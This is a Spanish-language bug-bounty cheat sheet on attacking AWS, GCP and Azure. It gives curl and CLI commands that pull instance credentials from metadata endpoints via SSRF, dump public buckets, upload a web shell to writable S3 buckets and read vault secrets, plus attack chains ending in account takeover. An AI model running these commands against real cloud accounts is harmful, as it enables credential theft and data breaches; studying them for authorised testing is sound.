---
title: "Cloud Hacking"
type: note
status: active
tags:
  - seguridad
  - cloud
  - aws
  - gcp
  - azure
aliases:
  - Hacking en la nube
  - AWS Hacking
  - GCP Hacking
  - Azure Hacking
created: 2026-06-13
updated: 2026-06-13
---

# Cloud Hacking

> [!INFO] Fuente
> Basado en PayloadsAllTheThings (Cloud), Rhino Security Labs, Hacking The Cloud (https://hackingthe.cloud), y reportes reales.

---

## AWS

### Metadata (IMDS)

La metadata de AWS vive en `http://169.254.169.254/latest/meta-data/`. Es el objetivo #1 de SSRF.

```bash
# IMDSv1 (sin proteccion)
curl http://169.254.169.254/latest/meta-data/

# IMDSv2 (requiere token)
TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/ -H "X-aws-ec2-metadata-token: $TOKEN"

# Lo que importa
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME
  # → AccessKeyId, SecretAccessKey, Token
```

### S3 Buckets

```bash
# Enumeracion de buckets
curl -s http://target.s3.amazonaws.com
curl -s http://target.s3-us-west-2.amazonaws.com
curl -s http://s3.amazonaws.com/target

# Busqueda de buckets abiertos
# bucketkicker, lazys3, s3scanner
s3scanner -bucket target

# Subir archivo (si el bucket permite escritura)
aws s3 cp shell.php s3://target-bucket/ --no-sign-request

# Descargar archivos (si el bucket es publico-lectura)
aws s3 sync s3://target-bucket/ ./target-dump/ --no-sign-request
```

### IAM

```bash
# Verificar permisos de las keys que tenes
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name USER
aws iam list-user-policies --user-name USER
aws iam list-user-tags --user-name USER

# Escalada comun: permisos permisivos
# iam:PassRole + ec2:RunInstances → crear instancia con rol admin

# Enumeracion de roles
aws iam list-roles
aws iam list-role-policies --role-name ROLE
```

### Lambda

```bash
# Si tenes access a Lambda
aws lambda list-functions --region us-east-1
aws lambda get-function --function-name FUNCTION --region us-east-1
aws lambda invoke --function-name FUNCTION output.txt

# Descargar codigo de la Lambda
# Ver la URL en el campo "Location" del get-function
# El codigo puede contener API keys, secrets de DB, etc.
```

### RDS

```bash
# SSRF a RDS
# Si hay una instancia RDS accesible, los endpoints son:
aws rds describe-db-instances --region us-east-1

# SSRF a Elasticsearch / OpenSearch
curl http://search-target.us-east-1.es.amazonaws.com/
```

---

## GCP

### Metadata

```bash
# Endpoint de metadata de GCP
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://target.com
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/?recursive=true
```

### Cloud Storage

```bash
# Buscar buckets
curl -s https://storage.googleapis.com/target-bucket
gsutil ls gs://target-bucket
gsutil cat gs://target-bucket/config.php

# Si es publico
gsutil ls gs://target-bucket --no-sign-request
```

### GKE (Kubernetes)

```bash
# Si hay SSRF y corre en GKE
# Metadata de K8s
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env

# Obtener token de service account de GKE
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
gcloud container clusters get-credentials CLUSTER --zone us-central1-a --project PROJECT
```

---

## Azure

### Metadata (IMDS)

```bash
# IMDS en Azure
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Storage Accounts

```bash
# Enumeracion
# Formato: https://STORAGEACCOUNT.blob.core.windows.net/CONTAINER
curl -s https://target.blob.core.windows.net/
curl -s https://target.blob.core.windows.net/CONTAINER?restype=container&comp=list

# Si es publico
az storage blob list --container-name CONTAINER --account-name ACCOUNT --auth-mode login
```

### Azure Key Vault

```bash
# Si tenes acceso a Key Vault
az keyvault secret list --vault-name VAULTNAME
az keyvault secret show --vault-name VAULTNAME --name SECRETNAME
```

---

## Cloud Attack Chains

### SSRF → Cloud Metadata → Full Compromise

```
1. Encontrar SSRF en la app web
2. Leer metadata cloud
3. Obtener Access Keys de la instancia
4. Enumerar servicios cloud
5. Encontrar S3 buckets con datos
6. s3 sync → data leak masivo
7. O buscar Lambdas con mas permisos
8. Escalar hasta control total de la cuenta
```

### IDOR en cloud

```
1. Encontrar IDOR en /api/user/attachments
2. Los archivos se almacenan en cloud
3. Obtener URLs firmadas (signed URLs) de S3/GCS/Blob
4. Las URLs firmadas expiran... o no
5. Si no expiran, tenes acceso permanente a datos
```

### Subdomain Takeover → Cloud Service

```
1. Encontrar CNAME a S3/CloudFront/Azure Blob/EBS
2. El recurso fue eliminado pero el CNAME sigue
3. Reclamar el recurso (crear bucket, configurar CDN)
4. Subir contenido malicioso
5. Tienes control de subdominio → XSS, phishing, cookie theft
```

---

## Herramientas cloud

| Herramienta | Uso |
|-------------|-----|
| Pacu (AWS) | Framework de exploitation para AWS |
| ScoutSuite | Auditoria de seguridad multi-cloud |
| CloudSploit | Escaneo de configuraciones inseguras |
| Cloudsplaining | Analisis de permisos IAM |
| GCPBucketBrute | Enumeracion de buckets GCP |
| MicroBurst | Azure exploitation toolkit |
| Stratus Red Team | Simulacion de ataques cloud reales |
| Cloudfox | Enumeracion cloud automatica |

---

## Lo que mas se paga en cloud

| Bug | Por que paga bien |
|-----|-------------------|
| SSRF → Metadata → Keys | Control total de infraestructura |
| S3 bucket publico con datos | PII, credenciales, backups |
| IAM privilege escalation | Acceso a toda la cuenta |
| Lambda code injection | Ejecucion de codigo en el provider |
| Cloudfront/S3 misconfig | Subdomain takeover potencial |

---

## Ver tambien

- [[SEGURIDAD/Hacking Activo]]
- [[SEGURIDAD/Vulnerabilidades Web]]
- [[SEGURIDAD/Reconocimiento]]
- [[SEGURIDAD/00 - INDICE]]
